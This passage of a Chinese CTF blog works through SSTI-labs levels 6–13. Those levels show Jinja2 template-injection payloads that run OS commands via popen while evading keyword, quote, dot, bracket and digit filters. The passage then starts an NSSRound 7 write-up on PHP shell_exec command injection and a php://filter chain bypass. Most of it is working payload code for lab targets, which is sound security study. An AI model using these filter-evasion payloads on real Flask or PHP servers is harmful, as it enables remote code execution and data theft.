#post传参(Content-Type:applicaation/x-www-form-urlencoded或                             multipart/form-data)</span><br><span class="line">request.data   #post传参(Content-Type:a/b)</span><br><span class="line">request.json #post传json  (Content-Type: application/json)</span><br></pre></td></tr></table></figure><p>然后看payload一下就能理解了<br>get：<code>?arg1=__builtins__&amp;arg2=__import__(&#39;os&#39;).popen(&#39;type flag&#39;).read()</code><br>post：<code>code=&#123;&#123;().__class__.__base__.__subclasses__()[100].__init__.__globals__[request.values.arg1].eval(request.values.arg2)&#125;&#125;</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303272013900.png" alt="image-20230327201347018"></p><h2 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h2><p>过滤了下划线<code>_</code>使用<code>|attr</code>过滤器，类似于Linux中的管道符<code>|</code>用前面的输出作为后面的操作对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;|attr(&quot;__class__&quot;)</span><br><span class="line">相当于</span><br><span class="line">&quot;&quot;.__class__</span><br></pre></td></tr></table></figure><p>get：<code>?arg1=__init__&amp;arg2=__globals__&amp;arg3=__getitem__&amp;arg4=__builtins__&amp;arg5=__import__(&#39;os&#39;).popen(&#39;type flag&#39;).read()</code><br>post：<code>code=&#123;&#123;(x|attr(request.values.arg1)|attr(request.values.arg2)|attr(request.values.arg3))(request.values.arg4).eval(request.values.arg5)&#125;&#125;</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303281056075.png" alt="image-20230327205244185"></p><h2 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h2><p>过滤了点<code>.</code>使用中括号进行绕过来拼接因为点的功能就是拼接中括号也有这一功能<br>将前面的payload改写一下<br><code>&#123;&#123;''.__class__.__base__.__subclasses__()[100].__init__.__globals__['__import__']('os').popen("type flag").read()&#125;&#125;</code><br>然后用中括号将点替换<br><code>&#123;&#123;''['__class__']['__base__']['__subclasses__']()[100]['__init__']['__globals__']['__import__']('os')['popen']("type flag")['read']()&#125;&#125;</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303281057996.png" alt="image-20230327202039586"></p><h2 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h2><p>这关过滤了一堆关键字，本来想fuzz一下但是没找到字典直接看wp的吧<br><code>&quot;class&quot;, &quot;arg&quot;, &quot;form&quot;, &quot;value&quot;, &quot;data&quot;, &quot;request&quot;, &quot;init&quot;, &quot;global&quot;, &quot;open&quot;, &quot;mro&quot;, &quot;base&quot;, &quot;attr&quot;</code><br>字符串拼接绕过<br><code>&#123;&#123;''['__cla''ss__']['__ba''se__']['__subcla''sses__']()[100]['__in''it__']['__glo''bals__']['__import__']('os')['pop''en']("type flag")['read']()&#125;&#125;</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303281057747.png" alt="image-20230328105734102"></p><h2 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h2><p>过滤了数字即限制索引使用<code>__getitem__</code>绕过<br>payload：<code>&#123;&#123;x.__init__.__globals__.__getitem__('__builtins__').eval("__import__('os').popen('type flag').read()")&#125;&#125;</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303281057504.png" alt="image-20230328105751445"><br>使用lipsum，flask的一个方法，可以用于得到<code>__builtins__</code>，而且<code>lipsum.__globals__</code>含有os模块：<code>&#123;&#123;lipsum.__globals__['os'].popen('ls').read()&#125;&#125;</code></p><p>payload：<code>&#123;&#123;lipsum|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("type flag")|attr("read")()&#125;&#125;</code><br>也能打通</p><h2 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h2><p>该题waf：<code>set config = None</code>，目标是得到config即配置文件而不是flag<br>这题可以通过url_for()或者get_flashed_messages()方法配合<br><strong>url_for()</strong> —- flask的一个方法，可以用于得到__builtins__，而且<code>url_for.__globals__[&#39;__builtins__&#39;]</code>含有<code>current_app</code></p><p><strong>get_flashed_messages()</strong> —- flask的一个方法，可以用于得到__builtins__，而且<code>url_for.__globals__[&#39;__builtins__&#39;]</code>含有<code>current_app</code></p><p><strong>current_app</strong> —- 应用上下文，一个全局变量。<br>payload：  <code>&#123;&#123;get_flashed_messages.__globals__['current_app'].config&#125;&#125;</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303281058523.png" alt="image-20230328105809669"><br>很奇怪这里利用url_for()失败了</p><h2 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h2><p>这一关过滤了单引号<code>&#39;</code> 双引号<code>&quot;</code> 加号<code>+</code> 关键字<code>request</code> 点号<code>.</code> 方括号<code>[]</code><br>感觉这关还是挺难的<br>先看一些过滤器吧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">常用的过滤器</span><br><span class="line"></span><br><span class="line">int()：将值转换为int类型；</span><br><span class="line"></span><br><span class="line">float()：将值转换为float类型；</span><br><span class="line"></span><br><span class="line">lower()：将字符串转换为小写；</span><br><span class="line"></span><br><span class="line">upper()：将字符串转换为大写；</span><br><span class="line"></span><br><span class="line">title()：把值中的每个单词的首字母都转成大写；</span><br><span class="line"></span><br><span class="line">capitalize()：把变量值的首字母转成大写，其余字母转小写；</span><br><span class="line"></span><br><span class="line">trim()：截取字符串前面和后面的空白字符；</span><br><span class="line"></span><br><span class="line">wordcount()：计算一个长字符串中单词的个数；</span><br><span class="line"></span><br><span class="line">reverse()：字符串反转；</span><br><span class="line"></span><br><span class="line">replace(value,old,new)： 替换将old替换为new的字符串；</span><br><span class="line"></span><br><span class="line">truncate(value,length=255,killwords=False)：截取length长度的字符串；</span><br><span class="line"></span><br><span class="line">striptags()：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；</span><br><span class="line"></span><br><span class="line">escape()或e：转义字符，会将&lt;、&gt;等符号转义成HTML中的符号。显例：content|escape或content|e。</span><br><span class="line"></span><br><span class="line">safe()： 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： &#123;&#123;&#x27;&lt;em&gt;hello&lt;/em&gt;&#x27;|safe&#125;&#125;；</span><br><span class="line"></span><br><span class="line">list()：将变量列成列表；</span><br><span class="line"></span><br><span class="line">string()：将变量转换成字符串；</span><br><span class="line"></span><br><span class="line">join()：将一个序列中的参数值拼接成字符串。示例看上面payload；</span><br><span class="line"></span><br><span class="line">abs()：返回一个数值的绝对值；</span><br><span class="line"></span><br><span class="line">first()：返回一个序列的第一个元素；</span><br><span class="line"></span><br><span class="line">last()：返回一个序列的最后一个元素；</span><br><span class="line"></span><br><span class="line">format(value,arags,*kwargs)：格式化字符串。比如：&#123;&#123; &quot;%s&quot; - &quot;%s&quot;|format(&#x27;Hello?&#x27;,&quot;Foo!&quot;) &#125;&#125;将输出：Helloo? - Foo!</span><br><span class="line"></span><br><span class="line">length()：返回一个序列或者字典的长度；</span><br><span class="line"></span><br><span class="line">sum()：返回列表内数值的和；</span><br><span class="line"></span><br><span class="line">sort()：返回排序后的列表；</span><br><span class="line"></span><br><span class="line">default(value,default_value,boolean=false)：如果当前变量没有值，则会使用参数中的值来代替。示例：name|default(&#x27;xiaotuo&#x27;)----如果name不存在，则会使用xiaotuo来替代。boolean=False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用or来替换。</span><br><span class="line"></span><br><span class="line">length()返回字符串的长度，别名是count</span><br></pre></td></tr></table></figure><p>先确定一个利用的payload<br><code>&#123;&#123;lipsum.__globals__.get('os').popen('type flag').read()&#125;&#125;</code><br>然后就是通过set设置变量搭配join进行替换绕过<br>通过<code>&#123;&#123;lipsum|string|list&#125;`获得一个字符串列表，然后通过pop函数可以取出使用<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello [&#x27;&lt;&#x27;, &#x27;f&#x27;, &#x27;u&#x27;, &#x27;n&#x27;, &#x27;c&#x27;, &#x27;t&#x27;, &#x27;i&#x27;, &#x27;o&#x27;, &#x27;n&#x27;, &#x27; &#x27;, &#x27;g&#x27;, &#x27;e&#x27;, &#x27;n&#x27;, &#x27;e&#x27;, &#x27;r&#x27;, &#x27;a&#x27;, &#x27;t&#x27;, &#x27;e&#x27;, &#x27;_&#x27;, &#x27;l&#x27;, &#x27;o&#x27;, &#x27;r&#x27;, &#x27;e&#x27;, &#x27;m&#x27;, &#x27;_&#x27;, &#x27;i&#x27;, &#x27;p&#x27;, &#x27;s&#x27;, &#x27;u&#x27;, &#x27;m&#x27;, &#x27; &#x27;, &#x27;a&#x27;, &#x27;t&#x27;, &#x27; &#x27;, &#x27;0&#x27;, &#x27;x&#x27;, &#x27;0&#x27;, &#x27;0&#x27;, &#x27;0&#x27;, &#x27;0&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;8&#x27;, &#x27;3&#x27;, &#x27;3&#x27;, &#x27;A&#x27;, &#x27;3&#x27;, &#x27;F&#x27;, &#x27;E&#x27;, &#x27;D&#x27;, &#x27;4&#x27;, &#x27;0&#x27;, &#x27;&gt;&#x27;]</span><br></pre></td></tr></table></figure>使用`|attr`将`.`替换，得到`&#123;&#123;lipsum|attr("__globals__")|attr("get")("os")|attr("popen")("type flag")|attr("read")()&#125;&#125;</code><br>然后构造字符绕过引号限制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set g=dict(get=1) | join %&#125;</span><br><span class="line">&#123;% set o=dict(os=1) | join %&#125;</span><br><span class="line">&#123;% set p=dict(popen=1) |join %&#125;</span><br><span class="line">&#123;% set r=dict(read=1) | join %&#125;</span><br></pre></td></tr></table></figure><p>此时payload为<br><code>&#123;&#123;lipsum|attr("__globals__")|attr(g)(o)|attr(p)("type flag")|attr(r)()&#125;&#125;</code><br>然后再构造<code>&quot;__globals__&quot;</code><br>先看下划线构造方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set pop=dict(pop=1)|join %&#125;</span><br><span class="line">&#123;% set underline=(lipsum|string|list)|attr(pop)(18) %&#125;</span><br></pre></td></tr></table></figure><p>然后将下划线和globals拼接赋值给global形成<code>&quot;__globals__&quot;</code><br><code>&#123;% set global=(underline,underline,dict(globals=1)|join,underline,underline)|join%&#125;</code><br>此时payload为<br><code>&#123;&#123;lipsum|attr(global)|attr(g)(o)|attr(p)("type flag")|attr(r)()&#125;&#125;</code><br>然后再构造<code>&quot;type flag&quot;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set t=dict(type=1)|join %&#125;</span><br><span class="line">&#123;% set f=dict(flag=1)|join %&#125;</span><br></pre></td></tr></table></figure><p>中间有个空格，构造个空格<br><code>&#123;% set space=(lipsum|string|list)|attr(pop)(9) %&#125;</code><br>然后拼接赋值给一个新变量<br><code>&#123;% set cmd=(t,space,f)|join%&#125;</code><br>到这里构造完成，此时的payload为<br><code>&#123;&#123;lipsum|attr(global)|attr(g)(o)|attr(p)(cmd)|attr(r)()&#125;&#125;</code><br>然后综合起来得到最终flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set g=dict(get=1)|join%&#125;</span><br><span class="line">&#123;% set o=dict(os=1)|join%&#125;</span><br><span class="line">&#123;% set p=dict(popen=1)|join%&#125;</span><br><span class="line">&#123;% set r=dict(read=1)|join%&#125;</span><br><span class="line">&#123;% set pop=dict(pop=1)|join %&#125;</span><br><span class="line">&#123;% set underline=(lipsum|string|list)|attr(pop)(18) %&#125;</span><br><span class="line">&#123;% set global=(underline,underline,dict(globals=1)|join,underline,underline)|join%&#125;</span><br><span class="line">&#123;% set t=dict(type=1)|join %&#125;</span><br><span class="line">&#123;% set f=dict(flag=1)|join %&#125;</span><br><span class="line">&#123;% set space=(lipsum|string|list)|attr(pop)(9) %&#125;</span><br><span class="line">&#123;% set cmd=(t,space,f)|join%&#125;</span><br><span class="line">&#123;&#123;lipsum|attr(global)|attr(g)(o)|attr(p)(cmd)|attr(r)()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303281058439.png" alt="image-20230328105827313"></p><h2 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h2><p>这一关过滤了下划线<code>_</code>,点<code>.</code>,数字<code>0-9</code>,反斜杠<code>\</code>,单引号<code>&#39;</code>,双引号<code>&quot;</code>,方括号<code>[]</code><br>就拿上题的payload，只不过需要加上9和18的构造，因为这两个数字被过滤无法直接使用下标<br>字符串列表获取和上一关一样，这里就不再弄了<br>思路就是利用函数index来获取索引位置的数字，然后利用数字相乘得到9和18，这里下划线被过滤了，不然可以直接得到18<br>先构造index函数<br><code>&#123;% set index=dict(index=a)|join %&#125;</code><br>然后获取2和3，通过<code>2*3*3</code>和<code>3*3</code>得到9和18</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set u=dict(u=a)|join %&#125;</span><br><span class="line">&#123;% set n=dict(n=a)|join %&#125;</span><br><span class="line">&#123;% set two=(lipsum|string|list)|attr(index)(u) %&#125;</span><br><span class="line">&#123;% set three=(lipsum|string|list)|attr(index)(n) %&#125;</span><br></pre></td></tr></table></figure><p>加上11关的payload，将数字替换即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set index=dict(index=a)|join%&#125;</span><br><span class="line">&#123;% set u=dict(u=a)|join%&#125;</span><br><span class="line">&#123;% set n=dict(n=a)|join%&#125;</span><br><span class="line">&#123;% set two=(lipsum|string|list)|attr(index)(u)%&#125;</span><br><span class="line">&#123;% set three=(lipsum|string|list)|attr(index)(n)%&#125;</span><br><span class="line">&#123;% set g=dict(get=a)|join%&#125;</span><br><span class="line">&#123;% set o=dict(os=a)|join%&#125;</span><br><span class="line">&#123;% set p=dict(popen=a)|join%&#125;</span><br><span class="line">&#123;% set r=dict(read=a)|join%&#125;</span><br><span class="line">&#123;% set pop=dict(pop=a)|join%&#125;</span><br><span class="line">&#123;% set underline=(lipsum|string|list)|attr(pop)(two*three*three)%&#125;</span><br><span class="line">&#123;% set global=(underline,underline,dict(globals=a)|join,underline,underline)|join%&#125;</span><br><span class="line">&#123;% set t=dict(type=a)|join %&#125;</span><br><span class="line">&#123;% set f=dict(flag=a)|join %&#125;</span><br><span class="line">&#123;% set space=(lipsum|string|list)|attr(pop)(three*three)%&#125;</span><br><span class="line">&#123;% set cmd=(t,space,f)|join%&#125;</span><br><span class="line">&#123;&#123;lipsum|attr(global)|attr(g)(o)|attr(p)(cmd)|attr(r)()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303281058125.png" alt="image-20230328105842324"></p><h2 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h2><p>这一关过滤了<code>_</code>,点<code>.</code>,反斜杠<code>\</code>,单引号<code>&#39;</code>,双引号<code>&quot;</code>,方括号<code>[]</code>,加号<code>+</code>,以及一些关键字<br><code>&#39;class&#39;</code>, <code>&#39;init&#39;</code>, <code>&#39;arg&#39;</code>, <code>&#39;config&#39;</code>, <code>&#39;app&#39;</code>, <code>&#39;self&#39;</code><br>但是11关的payload刚刚好避开了，所以直接用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set g=dict(get=1)|join%&#125;</span><br><span class="line">&#123;% set o=dict(os=1)|join%&#125;</span><br><span class="line">&#123;% set p=dict(popen=1)|join%&#125;</span><br><span class="line">&#123;% set r=dict(read=1)|join%&#125;</span><br><span class="line">&#123;% set pop=dict(pop=1)|join %&#125;</span><br><span class="line">&#123;% set underline=(lipsum|string|list)|attr(pop)(18) %&#125;</span><br><span class="line">&#123;% set global=(underline,underline,dict(globals=1)|join,underline,underline)|join%&#125;</span><br><span class="line">&#123;% set t=dict(type=1)|join %&#125;</span><br><span class="line">&#123;% set f=dict(flag=1)|join %&#125;</span><br><span class="line">&#123;% set space=(lipsum|string|list)|attr(pop)(9) %&#125;</span><br><span class="line">&#123;% set cmd=(t,space,f)|join%&#125;</span><br><span class="line">&#123;&#123;lipsum|attr(global)|attr(g)(o)|attr(p)(cmd)|attr(r)()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303281058257.png" alt="image-20230328105854397"></p><p>参考：<br><a href="https://www.o2takuxx.com/index.php/2022/09/20/ssti-labs%e9%9d%b6%e5%9c%ba/#toc-head-12">SSTI-Labs靶场 - o2takuXX の blogo2takuXX の blog</a><br><a href="https://johnfrod.top/ctf/flask-ssti-lab%E6%94%BB%E7%95%A5/">Flask SSTI LAB攻略 – JohnFrod’s Blog</a><br><a href="https://blog.csdn.net/miuzzx/article/details/110220425">SSTI模板注入绕过（进阶篇）_ssti绕过_yu22x的博客-CSDN博客</a><br><a href="https://chenlvtang.top/2021/03/31/SSTI%E8%BF%9B%E9%98%B6/">SSTI进阶 | 沉铝汤的破站 (chenlvtang.top)</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NSSRound 7 Team复现</title>
      <link href="/undefined/55851.html"/>
      <url>/undefined/55851.html</url>
      
        <content type="html"><![CDATA[<h1 id="ec-RCE"><a href="#ec-RCE" class="headerlink" title="ec_RCE"></a>ec_RCE</h1><p>一个比较简单的题，但是需要看懂代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- A EZ RCE IN REALWORLD _ FROM CHINA.TW --&gt;</span><br><span class="line">&lt;!-- By 探姬 --&gt;</span><br><span class="line"><span class="meta">&lt;?</span>PHP</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;action&quot;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;data&quot;</span>]))</span><br><span class="line">        <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&#x27;LANG=zh_TW.utf8&#x27;</span>); </span><br><span class="line"></span><br><span class="line">    <span class="variable">$action</span> = <span class="variable">$_POST</span>[<span class="string">&quot;action&quot;</span>];</span><br><span class="line">    <span class="variable">$data</span> = <span class="string">&quot;&#x27;&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&quot;data&quot;</span>].<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$output</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;/var/packages/Java8/target/j2sdk-image/bin/java -jar jar/NCHU.jar <span class="subst">$action</span> <span class="subst">$data</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$output</span>;    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>一开始还以为是个比较复杂的java题，一血也没有了就直接跳了，下面的shell_exec后面是执行jar文件，action和data可控直接利用<code>||</code>拼接一条cat命令即可</p><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/img202302262153808.png" alt="image-20230226215332433"></p><h1 id="0o0"><a href="#0o0" class="headerlink" title="0o0"></a>0o0</h1><p>直接F12可以看到一个get参数，当然抓包也行</p><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/img202302262156758.png" alt="image-20230226215602606"></p><p>然后传参发现下面源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;get:S0uRc3&#x27;</span>);  </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line"><span class="title function_ invoke__">set_include_path</span>(<span class="string">&#x27;Round7/&#x27;</span>);  </span><br><span class="line"><span class="comment">// include: Nss  </span></span><br><span class="line"><span class="comment">// include: level2  </span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;0o0&#x27;</span>])) &#123;    <span class="variable">$O0O</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;0o0&#x27;</span>],<span class="number">1</span>);  </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$O0O</span>, <span class="string">&#x27;Round7&#x27;</span>) === <span class="number">0</span>) &#123;  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;NO!!!!!   Permission denied!&#x27;</span>);   </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$O0O</span>, <span class="string">&#x27;Xy1on&#x27;</span>) === <span class="number">0</span>) &#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$O0O</span>;  </span><br><span class="line">        <span class="keyword">die</span>();  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Nothing!!!&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;S0uRc3&#x27;</span>]))&#123;    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    <span class="variable">$O0O</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;CTF&#x27;</span>,<span class="number">1</span>);  </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$O0O</span>;  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Nothing here&quot;</span>;  </span><br><span class="line">      </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里在0的位置上需要匹配到Xy1on，利用工具制作filter链绕过，<a href="https://github.com/synacktiv/php_filter_chain_generator">工具地址</a>这里需要注意在Linux下运行并且Xy1on后面要有个空格，否则会出现乱码，在Windows下加空格就会报错，访问level2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=level2</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/img202302262156261.png" alt="image-20230226215633307"></p><p>进入Ns_SCtF.php拿到源码，这里其实一开始扫目录的话会扫到一个DS_Store，进去会发现能直接看到Ns_SCtF.php只是需要删掉空格，这样就省略了上面的步骤，直接来到最后一步绕过</p><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/img202302262157980.png" alt="image-20230226215717918"></p><p>然后再看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$NSSCTF</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;NSSCTF&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$NsSCTF</span> = <span class="variable">$_GET</span>[<span 